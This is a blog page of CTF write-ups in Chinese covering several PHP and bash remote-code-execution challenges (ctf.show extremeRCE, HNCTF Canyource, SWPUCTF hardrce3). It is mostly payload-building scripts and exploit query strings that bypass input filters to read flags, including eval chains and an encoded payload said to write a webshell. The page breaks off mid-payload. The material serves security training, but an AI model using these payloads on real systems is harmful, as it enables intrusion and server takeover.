<h3 id="构造脚本"><a href="#构造脚本" class="headerlink" title="构造脚本"></a>构造脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line">res = <span class="string">&quot;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">	t = <span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:], <span class="number">10</span>)</span><br><span class="line">	</span><br><span class="line">	res +=<span class="string">&quot;\\\\$((~$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> * (t + <span class="number">1</span>) + <span class="string">&quot;))))&quot;</span>	<span class="comment"># 这里重复-1-1-1...然后计算凑成目标数</span></span><br><span class="line"></span><br><span class="line">res += <span class="string">&quot;\\&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=__=$(())%<span class="number">26</span>%<span class="number">26</span>$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\<span class="string">&#x27;\\$((.........))\&#x27;		# 注意&amp;&amp;要url编码</span></span><br></pre></td></tr></table></figure>

<h3 id="构造脚本2"><a href="#构造脚本2" class="headerlink" title="构造脚本2"></a>构造脚本2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#level5</span></span><br><span class="line">url=<span class="string">&quot;http://15a309e4-9e6d-4a18-8767-7be0a1efdfa9.challenge.ctf.show/&quot;</span></span><br><span class="line">cmd=<span class="string">&#x27;ls&#x27;</span></span><br><span class="line">r = &#123;&#125;</span><br><span class="line"></span><br><span class="line">x=<span class="string">&#x27;$((~$(())))&#x27;</span>	<span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        r[i]=<span class="string">&#x27;$((~$((&#x27;</span>+x</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                r[i]+=x</span><br><span class="line">        r[i]+=<span class="string">&#x27;))))&#x27;</span></span><br><span class="line"></span><br><span class="line">r[<span class="number">0</span>]=<span class="string">&#x27;$(())&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]:</span><br><span class="line">                payload+=r[<span class="built_in">int</span>(i)]</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者也可以先用记录各个数字字符  然后拼凑， 如</span></span><br><span class="line"><span class="comment"># ___=$((~$(($((~$(())))$((~$(())))))))&amp;&amp;____=$((~$(($((~$(())))$((~$(())))$((~$(())))))))&amp;&amp;_____=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&amp;&amp;______=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&amp;&amp;_______=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&amp;&amp;________=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&amp;&amp;_________=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&amp;&amp;__________=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&amp;&amp;___________=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span></span><br><span class="line"><span class="comment"># 相当于___=1,____=2,...</span></span><br><span class="line"><span class="comment"># &amp;&amp;$0&lt;&lt;&lt;$\&#x27;\\$___$_______$______\\$___$________$_____\&#x27;	# 执行了ls $&#x27;\154\163&#x27;</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/28/CTFSHOW-extremeRCE-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/26/HNCTF2022-Canyource-wp/" >HNCTF2022-week2-Canyource-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-26
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2950">题目链接</a>   </p>
<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/url|show|high|na|info|dec|oct|pi|log|data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>4#</code>中<code>\W</code>匹配所有”非word”的字符，即<code>[^0-9a-zA-Z]</code> 那么<code>[^\W]</code>即匹配<code>[0-9a-zA-Z]</code>   <code>(?R)?</code>为循环匹配搜索</p>
<h3 id="循环匹配探索"><a href="#循环匹配探索" class="headerlink" title="循环匹配探索"></a>循环匹配探索</h3><p>在上述的扩展表达式中有一个循环模式， 特殊项(?R)提供了递归的这种特殊用法，在PRCE模式中，考虑匹配圆括号内字符串的问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\((?R)?\)/&#x27;</span>,<span class="literal">NULL</span>,<span class="string">&#x27;((((()))()()()&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\((?R)?\)/&#x27;</span>,<span class="literal">NULL</span>,<span class="string">&#x27;((()))()()&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\((?R)?\)/&#x27;</span>,<span class="literal">NULL</span>,<span class="string">&#x27;((()))abc()cd()&#x27;</span>));</span><br><span class="line"><span class="comment">// string(2) &quot;((&quot;</span></span><br><span class="line"><span class="comment">// string(0) &quot;&quot;</span></span><br><span class="line"><span class="comment">// string(5) &quot;abccd&quot;</span></span><br></pre></td></tr></table></figure>

<p>也就是要进行无参函数构造</p>
<h3 id="无参函数构造"><a href="#无参函数构造" class="headerlink" title="无参函数构造"></a>无参函数构造</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">getcwd</span>();	<span class="comment">// 获取当前路径</span></span><br><span class="line"><span class="title function_ invoke__">dirname</span>();	<span class="comment">// 返回路径的上层路径</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>();	<span class="comment">// 改变工作目录</span></span><br><span class="line"><span class="title function_ invoke__">get_defined_vars</span>();	<span class="comment">// 返回由所有已定义变量所组成的数组</span></span><br><span class="line"><span class="title function_ invoke__">scandir</span>();	<span class="comment">// 扫描当前目录</span></span><br><span class="line"><span class="title function_ invoke__">current</span>();	<span class="comment">// 获取数组中最先加入的元素（默认第一个）</span></span><br><span class="line"><span class="title function_ invoke__">next</span>();		<span class="comment">// 获取数组中下一个元素</span></span><br><span class="line"><span class="title function_ invoke__">prev</span>();		<span class="comment">// 获取数组中上一个元素</span></span><br><span class="line"><span class="title function_ invoke__">end</span>();		<span class="comment">// 获取数组中最后一个元素</span></span><br><span class="line"><span class="title function_ invoke__">readfile</span>();<span class="title function_ invoke__">get_file_contents</span>();	<span class="comment">// 读取文件内容</span></span><br><span class="line"><span class="title function_ invoke__">array_flip</span>();	<span class="comment">// 数组中键值对互换</span></span><br><span class="line"><span class="title function_ invoke__">array_rand</span>();	<span class="comment">// 随机获取数组中的键</span></span><br></pre></td></tr></table></figure>

<h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>使用<code>get_defined_vars</code>： </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">get_defined_vars</span>());&amp;b=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="comment">// Array ( [_GET] =&gt; Array ( [code] =&gt; print_r(get_defined_vars()); [b] =&gt; system(&#x27;ls&#x27;); ) [_POST] =&gt; Array ( ) [_COOKIE] =&gt; Array ( ) [_FILES] =&gt; Array ( ) )</span></span><br></pre></td></tr></table></figure>

<p> 可以看到<code> [b] =&gt; system(&#39;ls&#39;);</code>也会出现在数组中    由此，我们只要进行数组元素获取并eval即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>()));&amp;b=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="comment">// Array ( [code] =&gt; print_r(current(get_defined_vars())); [b] =&gt; system(&#x27;ls&#x27;); )</span></span><br><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;b=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="comment">// system(&#x27;ls&#x27;);</span></span><br><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;b=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="comment">// flag.php index.php</span></span><br><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;b=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br><span class="line"><span class="comment">// 抓包或检查页面元素看到flag</span></span><br></pre></td></tr></table></figure>

<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>扫描目录  数组获取元素   读取文件内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"><span class="comment">// /var/www/html </span></span><br><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()));</span><br><span class="line"><span class="comment">// Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php )</span></span><br><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br><span class="line"><span class="comment">// Array ( [0] =&gt; index.php [1] =&gt; flag.php [2] =&gt; .. [3] =&gt; . )</span></span><br><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())))));</span><br><span class="line"><span class="comment">// flag....</span></span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br><span class="line"><span class="comment">//随机读取文件内容</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/26/HNCTF2022-Canyource-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/26/SWPUCTF2021-hardrce3-wp/" >SWPUCTF2021-hardrce3-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-26
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/467">题目链接</a>   </p>
<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\^&#x27;</span>, <span class="string">&#x27;\~&#x27;</span>, <span class="string">&#x27;\|&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;小伙子只会异或和取反？不好意思哦LTLT说不能用！！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9]/is&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;sAlGhul说用字母数字是没有灵魂的！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;蔡总说：注意审题！！！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>异或和取反明显都不行 采用自增构造   尝试发现执行system无果   使用<code>file_put_contents</code>写木马到文件  </p>
<blockquote>
<p>详见<a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/09/24/rce-noalpha/">无字母RCE</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?wllm=%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">40</span>%<span class="number">22</span>%<span class="number">24</span>_%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">5</span>B<span class="string">&#x27;!&#x27;</span>%<span class="number">3</span>D%<span class="number">3</span>D<span class="string">&#x27;%40&#x27;</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>___.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">3</span>D<span class="string">&#x27;_&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>____.%<span class="number">3</span>D%<span class="number">24</span>__%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">3</span>D%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span 